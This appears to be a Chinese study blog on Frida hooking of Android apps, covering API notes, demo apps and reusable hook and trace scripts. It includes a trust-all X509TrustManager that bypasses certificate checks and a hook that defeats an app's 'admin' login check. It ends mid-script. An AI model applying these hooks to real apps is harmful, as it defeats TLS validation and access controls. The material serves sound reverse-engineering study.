for(var i=0;i&lt;bytearr.length;i++) &#123; // 输出每个 byte 元素 console.log(bytearr[i]) &#125;&#125;); 索引 type 含义 1 Z boolean 2 B byte 3 C char 4 S short 5 I int 6 J long 7 F float 8 D double 9 V void # registerClass Java.registerClass ：创建一个新的 Java 类并返回一个包装器，其中规范是一个包含： name ：指定类名称的字符串。 superClass ：（可选）父类。要从 java.lang.Objec t 继承的省略。 implements ：（可选）由此类实现的接口数组。 fields ：（可选）对象，指定要公开的每个字段的名称和类型。 methods ：（可选）对象，指定要实现的方法。 Java.perform(function () &#123; // 注册一个目标进程中的类，返回的是一个类对象 var hellojni = Java.registerClass(&#123; name: 'com.roysue.roysueapplication.hellojni' &#125;); console.log(hellojni.addInt(1,2));&#125;);# 官方用法 - 绕过证书检验 这个方法太高端了，未来有机会自己写一个 demo 尝试一下 // 获取目标进程的 SomeBaseClass 类var SomeBaseClass = Java.use('com.example.SomeBaseClass');// 获取目标进程的 X509TrustManager 类var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');var MyWeirdTrustManager = Java.registerClass(&#123; // 注册一个类是进程中的 MyWeirdTrustManager 类 name: 'com.example.MyWeirdTrustManager', // 父类是 SomeBaseClass 类 superClass: SomeBaseClass, // 实现了 MyWeirdTrustManager 接口类 implements: [X509TrustManager], // 类中的属性 fields: &#123; description: 'java.lang.String', limit: 'int', &#125;, // 定义的方法 methods: &#123; // 类的构造函数 $init: function () &#123; console.log('Constructor called'); &#125;, //X509TrustManager 接口中方法之一，该方法作用是检查客户端的证书 checkClientTrusted: function (chain, authType) &#123; console.log('checkClientTrusted'); &#125;, // 该方法检查服务器的证书，不信任时。在这里通过自己实现该方法，可以使之信任我们指定的任何证书。在实现该方法时，也可以简单的不做任何处理，即一个空的函数体，由于不会抛出异常，它就会信任任何证书。 checkServerTrusted: [&#123; // 返回值类型 returnType: 'void', // 参数列表 argumentTypes: ['[Ljava.security.cert.X509Certificate;', 'java.lang.String'], // 实现方法 implementation: function (chain, authType) &#123; // 输出 console.log('checkServerTrusted A'); &#125; &#125;, &#123; returnType: 'java.util.List', argumentTypes: ['[Ljava.security.cert.X509Certificate;', 'java.lang.String', 'java.lang.String'], implementation: function (chain, authType, host) &#123; console.log('checkServerTrusted B'); // 返回 null 会信任所有证书 return null; &#125; &#125;], // 返回受信任的 X509 证书数组。 getAcceptedIssuers: function () &#123; console.log('getAcceptedIssuers'); return []; &#125;, &#125;&#125;);# [TODO] 一个小 demo, 可以用到 Java.registerClass (spec) # vm 这个方法也关联到 native 层了，先把 Java 层的 hook 搞搞明白吧 QAQ function frida_Java() &#123; Java.perform(function () &#123; // 拦截 getStr 函数 Interceptor.attach(Module.findExportByName(\"libhello.so\" , \"Java_com_roysue_roysueapplication_hellojni_getStr\"), &#123; onEnter: function(args) &#123; console.log(\"getStr\"); &#125;, onLeave:function(retval)&#123; // 它的返回值的是 retval 在 jni 层 getStr 的返回值的 jstring // 我们在这里做的事情就是替换掉结果 // 先获取一个 Env 对象 var env = Java.vm.getEnv(); // 通过 newStringUtf 方法构建一个 jstirng 字符串 var jstring = env.newStringUtf('roysue'); //replace 替换掉结果 retval.replace(jstring); console.log(\"getSum方法返回值为:roysue\") &#125; &#125;);&#125;setImmediate(frida_Java,0);# Interceptor 对象 # attach 函数原型: Interceptor.attach(target, callbacks) 参数 1: target 参数 target 是需要拦截的位置的函数地址，也就是填某个 so 层函数的地址即可对其拦截，他是一个 NativePointer 类型，需要注意的是对于 Thumb 函数需要对函数地址 +1 参数 2: callbacks callbacks 是触发拦截事件之后的触发的回调函数，他有以下两个回调函数 onEnter(args) 调用被 hook 函数时触发，给定一个参数 args ，可用于读取或写入参数作为 NativePointer 对象的数组 onLeave(retval) 被 hook 函数执行完毕时触发，可以调用 retval.replace（1337） 以整数 1337 替换返回值，或者调用 retval.replace（ptr（&quot;0x1234&quot;）） 以指针替换返回值。请注意，此对象在 OnLeave 调用中回收，因此不要将其存储在回调之外并使用它。如果需要存储包含的值，请制作深副本，例如： ptr(retval.toString()) 。 使用示例代码 // 使用 Module 对象 getExportByNameAPI 直接获取 libc.so 中的导出函数 read 的地址，对 read 函数进行附加拦截Interceptor.attach(Module.getExportByName('libc.so', 'read'), &#123; // 每次 read 函数调用的时候会执行 onEnter 回调函数 onEnter: function (args) &#123; this.fileDescriptor = args[0].toInt32(); &#125;, //read 函数执行完成之后会执行 onLeave 回调函数 onLeave: function (retval) &#123; if (retval.toInt32() > 0) &#123; /* do something with this.fileDescriptor */ &#125; &#125;&#125;);Interceptor.attach 函数的一些属性 属性 含义 returnAddress 返回地址，类型是 NativePointer context 上下文：具有键 pc 和 sp 的对象，它们是分别为 ia32/x64/arm 指定 EIP/RIP/PC 和 ESP/RSP/SP的NativePointer 对象。其他处理器特定的键也可用，例如 eax、rax、r0、x0 等。也可以通过分配给这些键来更新寄存器值。 errno 当前 errno 值 lastError 当前操作系统错误值 threadId 操作系统线程 ID depth 相对于其他调用的调用深度 # detachAll 让之前所有的 Interceptor.attach 附加拦截的回调函数失效。 # replace 相当于替换掉原本的函数，用替换时的实现替换目标处的函数 使用示例 function frida_Interceptor() &#123; Java.perform(function () &#123; // 这个 c_getSum 方法有两个 int 参数、返回结果为两个参数相加 // 这里用 NativeFunction 函数自己定义了一个 c_getSum 函数 var add_method = new NativeFunction(Module.findExportByName('libhello.so', 'c_getSum'), 'int',['int','int']); // 输出结果 那结果肯定就是 3 console.log(\"result:\",add_method(1,2)); // 这里对原函数的功能进行替换实现 Interceptor.replace(add_method, new NativeCallback(function (a, b) &#123; //h 不论是什么参数都返回 123 return 123; &#125;, 'int', ['int', 'int'])); // 再次调用 则返回 123 console.log(\"result:\",add_method(1,2)); &#125;);&#125;# NativePointer new NativePointer(s) : creates a new NativePointer from the string s containing a memory address in either decimal, or hexadecimal if prefixed with ‘0x’. You may use the ptr(s) short-hand for brevity. isNull() : returns a boolean allowing you to conveniently check if a pointer is NULL add(rhs) , sub(rhs) , and(rhs) , or(rhs) , xor(rhs) : makes a new NativePointer with this NativePointer plus/minus/and/or/xor rhs , which may either be a number or another NativePointer shr(n) , shl(n) : makes a new NativePointer with this NativePointer shifted right/left by n bits not() : makes a new NativePointer with this NativePointer’s bits inverted sign([key, data]) : makes a new NativePointer by taking this NativePointer’s bits and adding pointer authentication bits, creating a signed pointer. This is a no-op if the current process does not support pointer authentication, returning this NativePointer instead of a new value. Optionally, key may be specified as a string. Supported values are: ia: The IA key, for signing code pointers. This is the default. ib: The IB key, for signing code pointers. da: The DA key, for signing data pointers. db: The DB key, for signing data pointers. The data argument may also be specified as a NativePointer/number-like value to provide extra data used for the signing, and defaults to 0 . strip([key]) : makes a new NativePointer by taking this NativePointer’s bits and removing its pointer authentication bits, creating a raw pointer. This is a no-op if the current process does not support pointer authentication, returning this NativePointer instead of a new value. Optionally, key may be passed to specify which key was used to sign the pointer being stripped. Defaults to ia . (See sign() for supported values.) blend(smallInteger) : makes a new NativePointer by taking this NativePointer’s bits and blending them with a constant, which may in turn be passed to sign() as data . equals(rhs) : returns a boolean indicating whether rhs is equal to this one; i.e. it has the same pointer value compare(rhs) : returns an integer comparison result just like String#localeCompare() toInt32() : casts this NativePointer to a signed 32-bit integer toString([radix = 16]) : converts to a string of optional radix (defaults to 16) toMatchPattern() : returns a string containing a Memory.scan() -compatible match pattern for this pointer’s raw value readPointer() : reads a NativePointer from this memory location. A JavaScript exception will be thrown if the address isn’t readable. writePointer(ptr) : writes ptr to this memory location. A JavaScript exception will be thrown if the address isn’t writable. readS8() , readU8() , readS16() , readU16() , readS32() , readU32() , readShort() , readUShort() , readInt() , readUInt() , readFloat() , readDouble() : reads a signed or unsigned 8/16/32/etc. or float/double value from this memory location and returns it as a number. A JavaScript exception will be thrown if the address isn’t readable. writeS8(value) , writeU8(value) , writeS16(value) , writeU16(value) , writeS32(value) , writeU32(value) , writeShort(value) , writeUShort(value) , writeInt(value) , writeUInt(value) , writeFloat(value) , writeDouble(value) : writes a signed or unsigned 8/16/32/etc. or float/double value to this memory location. A JavaScript exception will be thrown if the address isn’t writable. readS64() , readU64() , readLong() , readULong() : reads a signed or unsigned 64-bit, or long-sized, value from this memory location and returns it as an Int64/UInt64 value. A JavaScript exception will be thrown if the address isn’t readable. writeS64(value) , writeU64(value) , writeLong(value) , writeULong(value) : writes the Int64/UInt64 value to this memory location. A JavaScript exception will be thrown if the address isn’t writable. readByteArray(length) : reads length bytes from this memory location, and returns it as an ArrayBuffer. This buffer may be efficiently transferred to your Frida-based application by passing it as the second argument to send() . A JavaScript exception will be thrown if any of the length bytes read from the address isn’t readable. writeByteArray(bytes) : writes bytes to this memory location, where bytes is either an ArrayBuffer, typically returned from readByteArray() , or an array of integers between 0 and 255. For example: [ 0x13, 0x37, 0x42 ] . A JavaScript exception will be thrown if any of the bytes written to the address isn’t writable. readCString([size = -1]) , readUtf8String([size = -1]) , readUtf16String([length = -1]) , readAnsiString([size = -1]) : reads the bytes at this memory location as an ASCII, UTF-8, UTF-16, or ANSI string. Supply the optional size argument if you know the size of the string in bytes, or omit it or specify -1 if the string is NUL-terminated. Likewise you may supply the optional length argument if you know the length of the string in characters. A JavaScript exception will be thrown if any of the size / length bytes read from the address isn’t readable. Note that readAnsiString() is only available (and relevant) on Windows. writeUtf8String(str) , writeUtf16String(str) , writeAnsiString(str) : encodes and writes the JavaScript string to this memory location (with NUL-terminator). A JavaScript exception will be thrown if any of the bytes written to the address isn’t writable. Note that writeAnsiString() is only available (and relevant) on Windows. # NativeFunction new NativeFunction(address, returnType, argTypes[, abi]) : create a new NativeFunction to call the function at address (specified with a NativePointer ), where returnType specifies the return type, and the argTypes array specifies the argument types. You may optionally also specify abi if not system default. For variadic functions, add a '...' entry to argTypes between the fixed arguments and the variadic ones. STRUCTS &amp; CLASSES BY VALUE As for structs or classes passed by value, instead of a string provide an array containing the struct’s field types following each other. You may nest these as deep as desired for representing structs inside structs. Note that the returned object is also a NativePointer , and can thus be passed to Interceptor#attach . This must match the struct/class exactly, so if you have a struct with three ints, you must pass ['int', 'int', 'int'] . For a class that has virtual methods, the first field will be a pointer to the vtable. For C++ scenarios involving a return value that is larger than Process.pointerSize , a typical ABI may expect that a NativePointer to preallocated space must be passed in as the first parameter. (This scenario is common in WebKit, for example.) SUPPORTED TYPES void pointer int uint long ulong char uchar size_t ssize_t float double int8 uint8 int16 uint16 int32 uint32 int64 uint64 bool SUPPORTED ABIS default Windows 32-bit: sysv stdcall thiscall fastcall mscdecl Windows 64-bit: win64 UNIX x86: sysv unix64 UNIX ARM: sysv vfp new NativeFunction(address, returnType, argTypes[, options]) : just like the previous constructor, but where the fourth argument, options , is an object that may contain one or more of the following keys: abi : same enum as above. scheduling : scheduling behavior as a string. Supported values are: cooperative: Allow other threads to execute JavaScript code while calling the native function, i.e. let go of the lock before the call, and re-acquire it afterwards. This is the default behavior. exclusive: Do not allow other threads to execute JavaScript code while calling the native function, i.e. keep holding the JavaScript lock. This is faster but may result in deadlocks. exceptions : exception behavior as a string. Supported values are: steal: If the called function generates a native exception, e.g. by dereferencing an invalid pointer, Frida will unwind the stack and steal the exception, turning it into a JavaScript exception that can be handled. This may leave the application in an undefined state, but is useful to avoid crashing the process while experimenting. This is the default behavior. propagate: Let the application deal with any native exceptions that occur during the function call. (Or, the handler installed through Process.setExceptionHandler() .) traps : code traps to be enabled, as a string. Supported values are: default: Interceptor.attach() callbacks will be called if any hooks are triggered by a function call. all: In addition to Interceptor callbacks, Stalker may also be temporarily reactivated for the duration of each function call. This is useful for e.g. measuring code coverage while guiding a fuzzer, implementing “step into” in a debugger, etc. Note that this is also possible when using the Java and ObjC APIs, as method wrappers also provide a clone(options) API to create a new method wrapper with custom NativeFunction options. # frida 使用示例 初步了解了一些 API 的定义和用法，接下来尝试一些例子来实践一下 # hook 函数的参数，并修改函数返回的结果 # source code package com.oacia.frida_a02_01_demo2;import androidx.appcompat.app.AppCompatActivity;import android.annotation.SuppressLint;import android.os.Bundle;import android.util.Log;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; @SuppressLint(\"SetTextI18n\") @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView myTextView = findViewById(R.id.MyTextView); //myTextView.setText(\"oacia: hello android!!nice to meet you~\"); myTextView.setText(\"oacia:Hello Android!\"); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; fun(50,30); &#125; &#125; void fun(int x,int y)&#123; Log.d(\"oacia-sum\",String.valueOf(x+y)); &#125;&#125;这个 app 的作用是每隔 1 秒 Log 输出 80, 接下来我将使用 frida 来打印 fun() 函数传入的参数，并且修改传入参数的值 # frida code function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.oacia.frida_a02_01_demo2.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \" + x + \",y = \" + y); console.log(\"oacia will change fun()'s argv[0] and argv[1]\"); console.log(\"wait and see~\"); const retv = this.fun(60,90); return retv; &#125; &#125;)&#125;setImmediate(hook,0);/**powershell * [SM P200::com.oacia.frida_a02_01_demo2 ]-> fun() called with x = 50,y = 30oacia will change fun()'s argv[0] and argv[1]wait and see~fun() called with x = 50,y = 30oacia will change fun()'s argv[0] and argv[1]wait and see~ *//**logcat04-05 20:16:07.521 27216 27216 D oacia-sum: 8004-05 20:16:08.522 27216 27216 D oacia-sum: 8004-05 20:16:09.522 27216 27216 D oacia-sum: 8004-05 20:16:26.420 27285 27285 D oacia-sum: 15004-05 20:16:27.421 27285 27285 D oacia-sum: 15004-05 20:16:28.425 27285 27285 D oacia-sum: 150*/# 函数重载时的 hook, 未使用的函数的调用 # source code package com.roysue.demo02;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private String total = \"@@@###@@@\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; fun(50,30); Log.d(\"ROYSUE.string\" , fun(\"LoWeRcAsE Me!!!!!!!!!\")); &#125; &#125; void fun(int x , int y )&#123; Log.d(\"ROYSUE.Sum\" , String.valueOf(x+y)); &#125; String fun(String x)&#123; total +=x; return x.toLowerCase(); &#125; String secret()&#123; return total; &#125;&#125;# frida code 函数重载 我们使用原来的代码试一试有重载的函数 function hook()&#123; Java.perform(function()&#123; var activity = Java.use(\"com.roysue.demo02.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"log successfully\"); &#125; &#125;)&#125;setImmediate(hook,0);这里将会报错，而且我们也需要经历报错的过程才知道我们需要加上的是哪一个重载类型 (毕竟现在感觉 java 的类型还是比较难记的，不如直接通过报错来直接复制粘贴重载函数参数的类型方便), 提示函数有重载，所以我们只需要根据提示，加上重载 .overload('java.lang.String') 即可 /** * * [SM-P200::com.roysue.demo02 ]-> Error: fun(): has more than one overload, use .overload(&lt;signature>) to choose from: .overload('java.lang.String') .overload('int', 'int') at X (frida/node_modules/frida-java-bridge/lib/class-factory.js:568) at K (frida/node_modules/frida-java-bridge/lib/class-factory.js:563) at set (frida/node_modules/frida-java-bridge/lib/class-factory.js:931) at &lt;anonymous> (D:\\frida\\AndroidSecurityStudy-master\\FRIDA\\A02\\02\\hook.js:3) at &lt;anonymous> (frida/node_modules/frida-java-bridge/lib/vm.js:12) at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250) at &lt;anonymous> (frida/node_modules/frida-java-bridge/index.js:242) at apply (native) at ne (frida/node_modules/frida-java-bridge/lib/class-factory.js:619) at &lt;anonymous> (frida/node_modules/frida-java-bridge/lib/class-factory.js:597)Process terminated */修改后的代码如下 //overload 的使用function hook1()&#123; Java.perform(function()&#123; var activity = Java.use(\"com.roysue.demo02.MainActivity\"); activity.fun.overload('java.lang.String').implementation = function(x)&#123; console.log(\"oacia find the real func,the arg type is java.lang.String!\"); var String_class = Java.use('java.lang.String'); var myStr = String_class.$new(\"oaciA ChaNge yOu!\");//new 一个字符串 var retv = this.fun(myStr); console.log(\"oacia change you,now it return \"+\"\\\"\" +retv +\"\\\"\"); return retv; &#125; &#125;)&#125;//setImmediate(hook1,0);/**cmd[SM-P200::com.roysue.demo02 ]-> oacia find the real func,the arg type is java.lang.String!oacia change you,now it return \"oacia change you!\" *//**logcat04-05 20:31:37.879 28305 28305 D ROYSUE.Sum: 8004-05 20:31:37.879 28305 28305 D ROYSUE.string: lowercase me!!!!!!!!!04-05 20:40:25.458 28514 28514 D ROYSUE.Sum: 8004-05 20:40:25.470 28514 28514 D ROYSUE.string: oacia change you! */ 未使用的函数的调用 // 调用未使用的函数function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);/**cmdSpawned `com.roysue.demo02`. Resuming main thread![SM-P200::com.roysue.demo02 ]-> find instance: com.roysue.demo02.MainActivity@7cdb8ddoacia find the secret function and the result is @@@###@@@LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!choose end~~ */假如一开始就使用 java.choose , 那么将捕获不到类，因为此时要捕获的类还没有加载所以这里使用 setTimeout (非阻塞方式) 来延迟 5s 捕获， com.roysue.demo02.MainActivity 此时类已经加载到内存中所以将会有回显，如果仍然使用 setImmediate(hook3,0); , 那么捕获不到类是必然的：) 更多有关延迟捕获可以看看这篇文章 # 函数的远程调用 当我们知道当我们特别想要调用一个 apk 中的某个函数，而且不止一次时，就是这个功能 — 函数的远程调用起作用的时候了 在 r0ysue 大佬写到此处中级能力：远程调用时，用的是 python 脚本来作为 js 的执行脚本，但是我不太喜欢 python 需要提前写那么多模板代码，而更喜欢 frida 直接使用命令行来将 js 脚本注入 apk 中，同时通过查阅资料我看到一个评论 所以我也决定使用这种方式来进行函数的远程调用，接下来就试一试能不能行得通吧 在上一个例子中，我们成功调用了未使用的函数 secret() , 稍微网上翻一翻就可以看到我们实现这个功能的代码为 function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);而我们假如需要多次调用 secret() 那么就需要对上面的 js 代码进行部分修改 function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;rpc.exports = &#123; HOOK3: hook3// 将函数 hook3 导出为 HOOK3 来进行调用，调用方式: rpc.exports.HOOK3 ()&#125;;/*setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);*/看看输出～ 成功实现！！！ # 互联互通、动态修改 # source code package com.roysue.demo04;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.util.Base64;import android.view.View;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; EditText username_et; EditText password_et; TextView message_tv; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); password_et = (EditText) this.findViewById(R.id.editText2); username_et = (EditText) this.findViewById(R.id.editText); message_tv = ((TextView) findViewById(R.id.textView)); this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if (username_et.getText().toString().compareTo(\"admin\") == 0) &#123; message_tv.setText(\"You cannot login as admin\"); return; &#125; //hook target message_tv.setText(\"Sending to the server :\" + Base64.encodeToString((username_et.getText().toString() + \":\" + password_et.getText().toString()).getBytes(), Base64.DEFAULT)); &#125; &#125;); &#125;&#125;# [TODO] 简要分析该 apk 在这个 apk 中，如果我们输入 admin, 那么程序将会返回 You cannot login as admin 这是因为在 apk 中有对用户名的校验，如果用户名为 admin 那么该 apk 将不会把这个 http 请求发送给服务器 (假装有个服务器.png) 接下来我们将要实现的是：当我们输入用户名为 admin , 密码为 123456 时，可以通过 admin 这个用户名来向服务器发送请求，而不会被程序的检测功能拦截 这里有两种实现思路: 第一种，绕过程序对于 admin 的检测 我们通过使用 jadx 对这个 apk 进行反编译，可以发现此处的代码的作用是对用户名是否为 admin 进行校验 那么我们只要使用 frida 让 compareTo 函数永远返回 true 不就可以绕过这个检测了吗 frida 代码如下 function hook()&#123; Java.perform(function()&#123; var string_class = Java.use(\"java.lang.String\"); string_class.compareTo.overload('java.lang.String').implementation = function(x)&#123; if(x===\"admin\")&#123; console.log(\"find compareTo !!! argv is \",x); return 1; &#125; return this.compareTo(x); &#125; &#125;)&#125;setImmediate(function()&#123; setTimeout(hook, 5000);// 这里经过尝试，如果不延迟五秒再 hook 的话，那么 frida 将会自动退出 (原因还不清楚)&#125;,0) [TODO] 第二种思路就是在向服务器发送消息前，将我们的用户名替换为 admin 比如我一开始输入的用户名为 oacia , 那么这肯定是可以过程序对于用户名是否为 admin 的校验的，实际上，我们 hook 的代码应该是在此处的 我们就假装 textView.setText(sb.toString()); 这行代码就是向服务器发送消息的代码：) 所以我们将会用 frida 来做什么呢？没错，我们将要修改 sb 这个变量 # hook 某个类的构造函数 # source code User 类 package com.oacia.inithook;public class User &#123; public int age; public String name; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code 对于构造函数的 hook, 我们需要使用 $init 这个关键词来进行 hook function hook()&#123; if(Java.available)&#123; Java.perform(function()&#123; console.log(\"start hook~\"); const User = Java.use(\"com.oacia.inithook.User\"); if(User != undefined)&#123; User.$init.overload('java.lang.String', 'int').implementation = function(name,age)&#123; console.log(\"hook constructor,overload('java.lang.String', 'int')!!!\"); console.log(\"name = \",name,\", age = \",age); return this.$init(name,age); &#125; User.$init.overload().implementation = function()&#123; console.log(\"hook constructor,overload()!!!\"); &#125; console.log(\"hook end~\"); &#125; &#125;) &#125;&#125;setImmediate(hook,0);# 主动调用一个类 # source code package com.oacia.inithook;public class User &#123; public int age; public String name; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code 当我们想要主动去调用一个类时，我们可以使用 $new 关键字来新建一个实例 function hook()&#123; Java.perform(function()&#123; var User = Java.use(\"com.oacia.inithook.User\"); var me = User.$new(\"ooooacia\",999); var info = me.toString(); console.log(info); console.log(\"change info ing...\"); me.name.value = \"oaciaaaa\"; me.age.value = 20; info = me.toString(); console.log(info) &#125;)&#125;setImmediate(hook,0);# hook 内部类 # source code package com.oacia.inithook;public class User &#123; public int age; public String name; class signin&#123; private String uid; private String passwd; public signin(String uid_,String passwd_)&#123; this.uid = uid_; this.passwd = passwd_; &#125; public String toString()&#123; StringBuilder sb = new StringBuilder(); sb.append(\"signin&#123;uid=\"); sb.append(this.uid); sb.append(\", passwd=\"); sb.append(this.passwd); return sb.toString(); &#125; &#125; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code 在此处给出的 source code 中，内部类的名称为 signin , 如果我们想要去 hook 内部类，那么我们需要使用如下的语法来进行 hook com.oacia.inithook.User$signin function hook_inner()&#123; Java.perform(function()&#123; var signin = Java.use(\"com.oacia.inithook.User$signin\"); signin.toString.implementation = function()&#123; console.log(\"成功hook内部类signin中的toString函数!!\"); var ret = this.toString(); console.log(\"return value: \",ret); return ret; &#125; &#125;)&#125;setImmediate(hook_inner,0);# frida 常用脚本 # Java 层 # hook java 中一个类的函数并修改参数 function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.oacia.frida_a02_01_demo2.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \" + x + \",y = \" + y); const retv = this.fun(60,90); return retv; &#125; &#125;)&#125;setImmediate(hook,0);# hook 一个类的所有重载函数 function hook()&#123; Java.perform(function()&#123; const ctx = Java.use(\"com.ss.android.ugc.aweme.share.ShareDependServiceImpl\"); const overloads = ctx[\"LIZ\"].overloads; for (var i=0;i&lt; overloads.length;i++)&#123; overloads[i].implementation = function () &#123; var params = \"\"; for(var j=0;j&lt;arguments.length;j++)&#123; params = params +arguments[j]+\" \" &#125; console.log(\"params\",params) return this.LIZ.apply(this,arguments); &#125;; &#125; &#125;)&#125;# enum class/method &amp;&amp; find class //from https://github.com/0xdea/frida-scripts/// enumerate all Java classesfunction enumAllClasses()&#123; var allClasses = []; var classes = Java.enumerateLoadedClassesSync(); classes.forEach(function(aClass) &#123; try &#123; var className = aClass.match(/[L](.*);/)[1].replace(/\\//g, \".\"); &#125; catch(err) &#123;return;&#125; // avoid TypeError: cannot read property 1 of null allClasses.push(className); &#125;); return allClasses;&#125;// find all Java classes that match a patternfunction findClasses(pattern)&#123; var allClasses = enumAllClasses(); var foundClasses = []; allClasses.forEach(function(aClass) &#123; try &#123; if (aClass.match(pattern)) &#123; foundClasses.push(aClass); &#125; &#125; catch(err) &#123;&#125; // avoid TypeError: cannot read property 'match' of undefined &#125;); return foundClasses;&#125;// enumerate all methods declared in a Java classfunction enumMethods(targetClass)&#123; var hook = Java.use(targetClass); var ownMethods = hook.class.getDeclaredMethods(); hook.$dispose; return ownMethods;&#125;/* * The following functions were not implemented because deemed impractical: * * enumAllMethods() - enumerate all methods declared in all Java classes * findMethods(pattern) - find all Java methods that match a pattern * * See raptor_frida_ios_enum.js for a couple of ObjC implementation examples. */// usage examplessetTimeout(function() &#123; // avoid java.lang.ClassNotFoundException Java.perform(function() &#123; // enumerate all classes /* var a = enumAllClasses(); a.forEach(function(s) &#123; console.log(s); &#125;); */ // find classes that match a pattern /* var a = findClasses(/password/i); a.forEach(function(s) &#123; console.log(s); &#125;); */ // enumerate all methods in a class /* var a = enumMethods(\"com.target.app.PasswordManager\") a.forEach(function(s) &#123; console.log(s); &#125;); */ &#125;);&#125;, 0);# trace module/class/method //from https://github.com/0xdea/frida-scripts/// generic tracefunction trace(pattern)&#123; var type = (pattern.toString().indexOf(\"!\") === -1) ? \"java\" : \"module\"; if (type === \"module\") &#123; console.log(\"module\") // trace Module var res = new ApiResolver(\"module\"); var matches = res.enumerateMatchesSync(pattern); var targets = uniqBy(matches, JSON.stringify); targets.forEach(function(target) &#123; try&#123; traceModule(target.address, target.name); &#125; catch(err)&#123;&#125; &#125;); &#125; else if (type === \"java\") &#123; console.log(\"java\") // trace Java Class var found = false; Java.enumerateLoadedClasses(&#123; onMatch: function(aClass) &#123; if (aClass.match(pattern)) &#123; found = true; console.log(\"found is true\") console.log(\"before:\"+aClass) //var className = aClass.match(/[L](.*);/)[1].replace(/\\//g, \".\"); var className = aClass.match(/[L]?(.*);?/)[1].replace(/\\//g, \".\"); console.log(\"after:\"+className) traceClass(className); &#125; &#125;, onComplete: function() &#123;&#125; &#125;); // trace Java Method if (!found) &#123; try &#123; traceMethod(pattern); &#125; catch(err) &#123; // catch non existing classes/methods console.error(err); &#125; &#125; &#125;&#125;// find and trace all methods declared in a Java Classfunction traceClass(targetClass)&#123; console.log(\"entering traceClass\") var hook = Java.use(targetClass); var methods = hook.class.getDeclaredMethods(); hook.$dispose(); console.log(\"entering pasedMethods\") var parsedMethods = []; methods.forEach(function(method) &#123; try&#123; parsedMethods.push(method.toString().replace(targetClass + \".\", \"TOKEN\").match(/\\sTOKEN(.*)\\(/)[1]); &#125; catch(err)&#123;&#125; &#125;); console.log(\"entering traceMethods\") var targets = uniqBy(parsedMethods, JSON.stringify); targets.forEach(function(targetMethod) &#123; try&#123; traceMethod(targetClass + \".\" + targetMethod); &#125; catch(err)&#123;&#125; &#125;);&#125;// trace a specific Java Methodfunction traceMethod(targetClassMethod)&#123; var delim = targetClassMethod.lastIndexOf(\".\"); if (delim === -1) return; var targetClass = targetClassMethod.slice(0, delim) var targetMethod = targetClassMethod.slice(delim + 1, targetClassMethod.length) var hook = Java.use(targetClass); var overloadCount = hook[targetMethod].overloads.length; console.log(\"Tracing \" + targetClassMethod + \" [\" + overloadCount + \" overload(s)]\"); for (var i = 0; i &lt; overloadCount; i++) &#123; hook[targetMethod].overloads[i].implementation = function() &#123; console.warn(\"\\n*** entered \" + targetClassMethod); // print backtrace // Java.perform(function() &#123; // var bt = Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new()); // console.log(\"\\nBacktrace:\\n\" + bt); // &#125;); // print args if (arguments.length) 